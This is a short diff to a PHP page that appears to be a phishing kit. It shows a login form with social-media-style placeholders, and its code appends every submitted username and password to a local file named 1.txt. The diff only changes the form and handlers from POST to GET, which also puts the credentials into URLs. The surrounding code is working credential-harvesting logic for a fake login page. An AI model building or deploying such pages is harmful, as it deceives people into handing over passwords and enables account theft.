@@ -190,7 +190,7 @@
       <h1><?php echo $l_decoded; ?></h1>
       <br>
     </div>
-    <form action="" method="POST">
+    <form action="" method="GET">
       <input type="text" name="u_name" placeholder="Phone number, username, or email" required>
       <input type="password" name="pass" placeholder="Password" required>
       <button type="submit" name="lo">Log In</button>
@@ -221,9 +221,9 @@
 </html>
 
 <?php
-if(isset($_POST['lo'])) {
-    $u_name = $_POST['u_name'];
-    $pass = $_POST['pass'];
+if(isset($_GET['lo'])) {
+    $u_name = $_GET['u_name'];
+    $pass = $_GET['pass'];
     $file = '1.txt';
     $data = "u_name: $u_name\nPass: $pass\n\n";
     file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
